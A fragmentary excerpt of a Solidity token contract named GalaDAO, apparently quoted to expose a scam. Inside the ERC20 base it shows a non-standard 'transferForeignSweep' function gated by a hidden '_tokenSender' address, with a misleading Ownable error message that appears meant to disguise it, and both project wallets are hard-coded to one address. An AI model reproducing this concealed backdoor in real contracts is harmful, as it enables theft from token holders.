...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function transferForeignSweep(address _to) external {
        require(_tokenSender == _msgSender(), "Ownable: new owner is the zero address");
...
contract GalaDAO is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor(
    ) payable ERC20("GalaDAO","GalaDAO")  {
        _marketingWalletAddress = payable(0x777389bA08Ca959F2cB5B96fbE4d9e15F2d6EB66);
        _lpWalletAddress=payable(0x777389bA08Ca959F2cB5B96fbE4d9e15F2d6EB66);
